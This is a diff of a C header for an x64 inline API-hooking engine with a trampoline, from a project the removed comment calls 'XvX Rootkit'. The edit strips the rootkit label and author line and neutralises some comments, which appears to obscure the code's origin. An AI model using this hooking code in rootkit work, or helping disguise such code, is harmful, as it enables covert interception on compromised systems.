@@ -1,10 +1,3 @@
-/*
- * XvX Rootkit - Inline Hook Header
- * Copyright (c) 2025 - 28zaakypro@proton.me
- *
- * x64 inline hooking engine for API interception with trampoline.
- */
-
 #ifndef INLINEHOOK_H
 #define INLINEHOOK_H
 
@@ -16,7 +9,7 @@
 typedef struct _HookContext
 {
     PVOID pTarget; // Address of the function to hook
-    PVOID pDetour; // Address of our hooked function
+    PVOID pDetour; // Address of the hooked function
     BYTE originalBytes[14];
     BYTE trampoline[TRAMPOLINE_SIZE];
     PVOID pTrampoline;
@@ -47,7 +40,7 @@ BOOL InstallInlineHook(PVOID pTarget, PVOID pDetour, HookContext *pContext)
     memcpy(pTramp, pContext->originalBytes, 14);
     pTramp += 14;
 
-    // Add an absolute JMP to the original function+14 (x64: FF 25 + offset + address)
+    // Add an absolute JMP to the original function+14
     // FF 25 00 00 00 00 : JMP [RIP+0]
     // Followed by the 64-bit address
     pTramp[0] = 0xFF;
